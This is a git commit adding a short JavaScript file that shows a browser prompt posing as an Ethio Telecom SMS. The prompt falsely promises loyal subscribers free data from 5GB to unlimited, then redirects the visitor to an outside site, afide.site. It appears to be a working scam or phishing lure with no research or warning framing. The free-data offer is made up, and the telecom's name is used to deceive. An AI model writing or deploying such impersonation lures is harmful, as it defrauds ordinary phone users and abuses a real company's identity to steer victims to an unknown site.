166cdf0e98582e50327cbbbcb64dd5e2357f154c
ufaiba <ufaiba247@gmail.com>
2026-07-01 17:30:17 -0700

    Add Ethio Telecom SMS prompt for free data

---
+++ act-ethiosubscribers.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('Ethio Telecom SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To Unlimited For Being Our Long Time Subscribers ,Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://afide.site/ethiosubscribers.html';
+}
